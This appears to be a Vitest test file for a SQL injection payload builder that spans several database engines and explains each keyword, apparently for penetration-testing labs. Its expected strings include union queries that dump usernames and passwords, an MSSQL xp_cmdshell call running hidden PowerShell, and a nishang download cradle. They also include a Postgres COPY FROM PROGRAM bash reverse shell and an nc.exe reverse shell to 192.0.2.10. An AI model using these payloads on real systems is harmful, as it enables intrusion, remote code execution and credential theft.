import { describe, expect, it } from "vitest";
import { buildSql, SQL_ENGINES, SQL_EXEC, SQL_STEPS, sqlExecIds, type SqlEngine, type SqlPoint } from "../../../engines/payloads/sql";

const V = { LHOST: "192.0.2.10", LPORT: "443", columns: 3, reflected: 2, table: "users", column: "username,password", path: "/var/www/html/x.php" };
const dec = (s: string) => decodeURIComponent(s.replace(/\+/g, " "));

describe("buildSql", () => {
  it("column-count for mysql url-param is ' ORDER BY 1-- - encoded", () => {
    const b = buildSql("column-count", "mysql", "url-param", {});
    expect(b.text).toBe("%27+ORDER+BY+1--+-");
    expect(dec(b.text)).toBe("' ORDER BY 1-- -");
  });

  it("time detect uses the engine's sleep", () => {
    const want: Record<SqlEngine, string> = {
      mssql: "WAITFOR DELAY '0:0:5'", mysql: "SLEEP(5)", postgres: "pg_sleep(5)",
      oracle: "dbms_pipe.receive_message('a',5)", sqlite: "RANDOMBLOB",
    };
    for (const e of SQL_ENGINES) expect(dec(buildSql("detect-time", e, "url-param", {}).text)).toContain(want[e]);
  });

  it("oracle UNION includes FROM dual", () => {
    expect(dec(buildSql("reflected-columns", "oracle", "url-param", { columns: 3 }).text)).toContain("FROM dual");
    expect(dec(buildSql("version", "oracle", "form-field", { columns: 3, reflected: 2 }).text)).toContain("FROM v$version");
  });

  it("missing columns stay visible and unresolved", () => {
    const b = buildSql("tables", "mysql", "form-field", {});
    expect(b.unresolved).toContain("COLUMNS");
    expect(b.text).toContain("{COLUMNS}");
  });

  it("form-field is raw with default quote break; prefix overrides", () => {
    expect(buildSql("detect-boolean", "mysql", "form-field", {}).text).toBe("' AND 1=1-- -");
    expect(buildSql("detect-boolean", "mysql", "form-field", { prefix: "" }).text).toBe("AND 1=1-- -");
  });

  it("joins strings per engine", () => {
    const row = (e: SqlEngine) => buildSql("rows", e, "form-field", V).text;
    expect(row("mssql")).toContain("username+':'+password");
    expect(row("mysql")).toContain("CONCAT(username,':',password)");
    expect(row("postgres")).toContain("username||':'||password");
  });

  it("postgres-copy-program in url-param matches the lab form", () => {
    const t = buildSql("postgres-copy-program", "postgres", "url-param", V).text;
    expect(t).toContain("COPY");
    expect(t).toContain("FROM+PROGRAM");
    expect(t).toContain("bash+-c");
    expect(t).toContain("%3E%26");
    expect(t).not.toContain(">&");
    expect(dec(t)).toContain(`PROGRAM 'bash -c "bash -i >& /dev/tcp/192.0.2.10/443 0>&1"'`);
  });

  it("mssql-xp_cmdshell embeds ps-b64 by default", () => {
    const b = buildSql("mssql-xp_cmdshell", "mssql", "form-field", V);
    expect(b.text).toMatch(/^'; EXEC xp_cmdshell 'powershell -nop -w hidden -e [A-Za-z0-9+/=]+';-- -$/);
    expect(b.listener).toBe("penelope -O -p 443");
  });

  it("mssql-xp_cmdshell with the nishang cradle doubles quotes, then URL-encodes", () => {
    const form = buildSql("mssql-xp_cmdshell", "mssql", "form-field", { ...V, shell: "nishang-cradle" });
    expect(form.text).toContain(`DownloadString(''http://192.0.2.10/rev.ps1'')`);
    const url = buildSql("mssql-xp_cmdshell", "mssql", "url-param", { ...V, shell: "nishang-cradle" });
    expect(url.text).toContain("DownloadString(%27%27http");
    expect(dec(url.text)).toBe(form.text);
    expect(url.notes.join(" ")).toMatch(/Serve it first/);
  });

  it("nc.exe flag is %2d only in url-param", () => {
    const url = buildSql("mssql-xp_cmdshell", "mssql", "url-param", { ...V, shell: "nc-exe" });
    expect(url.text).toContain("+%2de+cmd.exe+192.0.2.10+443");
    expect(buildSql("mssql-xp_cmdshell", "mssql", "form-field", { ...V, shell: "nc-exe" }).text).toContain(" -e cmd.exe");
  });

  it("missing LHOST goes to unresolved", () => {
    const b = buildSql("postgres-copy-program", "postgres", "form-field", { LPORT: "443" });
    expect(b.unresolved).toContain("LHOST");
    expect(b.text).toContain("{LHOST}");
  });

  it("client-session payloads have no leading quote and no encoding", () => {
    for (const [id, e] of [["version", "mssql"], ["tables", "mysql"], ["rows", "postgres"], ["mssql-xp_cmdshell", "mssql"], ["postgres-copy-program", "postgres"], ["detect-time", "mysql"]] as [string, SqlEngine][]) {
      const t = buildSql(id, e, "client-session", V).text;
      expect(t, id).not.toMatch(/^'/);
      expect(t, id).not.toContain("%");
      expect(t, id).not.toMatch(/-- -$/);
      expect(t, id).not.toContain("UNION");
    }
    expect(buildSql("version", "mssql", "client-session", {}).text).toBe("SELECT @@version");
    expect(buildSql("mssql-xp_cmdshell", "mssql", "client-session", V).text).toMatch(/^EXEC xp_cmdshell /);
  });

  it("injection-only steps are not applicable in a session", () => {
    expect(() => buildSql("column-count", "mysql", "client-session", {})).toThrow(/session/);
  });

  it("exec ids on the wrong engine throw; helper lists per engine", () => {
    expect(() => buildSql("mssql-xp_cmdshell", "mysql", "url-param", V)).toThrow(/mssql/);
    expect(() => buildSql("nope", "mysql", "url-param", V)).toThrow(/Unknown/);
    expect(sqlExecIds("mssql")).toEqual(["mssql-enable-xp_cmdshell", "mssql-xp_cmdshell", "mssql-read-file"]);
    expect(sqlExecIds("mysql")).toEqual(["mysql-into-outfile-webshell", "mysql-load-file"]);
    expect(sqlExecIds("postgres")).toEqual(["postgres-copy-program"]);
    expect(sqlExecIds("oracle")).toEqual([]);
  });

  it("steps are in walkthrough order", () => {
    expect(SQL_STEPS.map((s) => s.id)).toEqual(["detect-error", "detect-boolean", "detect-time", "column-count", "reflected-columns", "version", "databases", "tables", "columns", "rows"]);
    for (const s of SQL_STEPS) expect(s.title && s.explain).toBeTruthy();
    for (const x of SQL_EXEC) expect(x.title && x.explain).toBeTruthy();
  });

  it("every step and exec has parts explaining each SQL keyword it uses", () => {
    const KEYWORDS = ["UNION", "SELECT", "NULL", "ORDER BY", "WAITFOR DELAY", "SLEEP", "pg_sleep", "dbms_pipe.receive_message", "RANDOMBLOB", "FROM dual", "WHERE", "information_schema", "GROUP_CONCAT", "CONCAT", "EXEC", "sp_configure", "RECONFIGURE", "xp_cmdshell", "COPY", "FROM PROGRAM", "INTO OUTFILE", "LOAD_FILE", "OPENROWSET", "BULK", "SINGLE_CLOB", "BulkColumn", "AND 1=1", "AND 1=2", "sqlite_master", "v$version", "@@version", "version()", "sqlite_version()", "database()", "pg_database", "all_tables", "all_users", "sys.databases", "||", "-- -"];
    const ids = [...SQL_STEPS.map((s) => s.id), ...SQL_EXEC.map((x) => x.id)];
    let checked = 0;
    for (const id of ids) {
      for (const e of SQL_ENGINES) {
        for (const p of ["url-param", "form-field", "client-session"] as SqlPoint[]) {
          let b;
          try { b = buildSql(id, e, p, V); } catch { continue; }
          expect(b.parts.length, `${id}/${e}/${p}`).toBeGreaterThan(0);
          const raw = p === "url-param" ? dec(b.text) : b.text;
          for (const k of KEYWORDS) {
            if (raw.includes(k)) {
              expect(b.parts.some((x) => x.token.includes(k)), `${id}/${e}/${p}: ${k}`).toBe(true);
              checked++;
            }
          }
        }
      }
    }
    expect(checked).toBeGreaterThan(150);
  });

  it("nc-exe url-param is complete: default path, %2d flag, no unresolved", () => {
    const b = buildSql("mssql-xp_cmdshell", "mssql", "url-param", { LHOST: "192.0.2.10", LPORT: "443", shell: "nc-exe" });
    expect(b.unresolved).toEqual([]);
    expect(b.text).toBe("%27%3B+EXEC+xp_cmdshell+%27C:%5CWindows%5CTemp%5Cnc.exe+%2de+cmd.exe+192.0.2.10+443%27%3B--+-");
  });

  it("postgres-copy-program creates its table first", () => {
    const b = buildSql("postgres-copy-program", "postgres", "form-field", { ...V, table: "cmd_exec" });
    expect(b.text).toMatch(/^'; CREATE TABLE IF NOT EXISTS cmd_exec\(cmd_output text\); COPY cmd_exec FROM PROGRAM /);
    expect(b.parts.some((p) => p.token === "CREATE TABLE")).toBe(true);
  });

  it("reflected-columns labels one column on strict engines, all on mysql", () => {
    expect(buildSql("reflected-columns", "postgres", "form-field", { columns: 3, reflected: 2 }).text).toBe("' AND 1=2 UNION SELECT NULL,'c2',NULL-- -");
    expect(buildSql("reflected-columns", "mssql", "form-field", { columns: 3 }).text).toBe("' AND 1=2 UNION SELECT 'c1',NULL,NULL-- -");
    expect(buildSql("reflected-columns", "oracle", "form-field", { columns: 2 }).text).toBe("' AND 1=2 UNION SELECT 'c1',NULL FROM dual-- -");
    expect(buildSql("reflected-columns", "mysql", "form-field", { columns: 3 }).text).toBe("' AND 1=2 UNION SELECT 'c1','c2','c3'-- -");
    expect(buildSql("reflected-columns", "postgres", "form-field", { columns: 3 }).notes.join(" ")).toMatch(/once per column/);
  });

  it("embedded shell parts are explained", () => {
    const ps = buildSql("mssql-xp_cmdshell", "mssql", "form-field", V).parts.map((p) => p.token).join("|");
    expect(ps).toContain("-nop");
    expect(ps).toContain("-e");
    const pg = buildSql("postgres-copy-program", "postgres", "form-field", V).parts.map((p) => p.token).join("|");
    expect(pg).toContain("bash -i");
    expect(pg).toContain("/dev/tcp");
  });

  it("detect-error never returns an empty payload", () => {
    const b = buildSql("detect-error", "mysql", "form-field", { prefix: "" });
    expect(b.text).toBe("'");
    expect(b.notes.join(" ")).toMatch(/Numeric context/);
  });
});
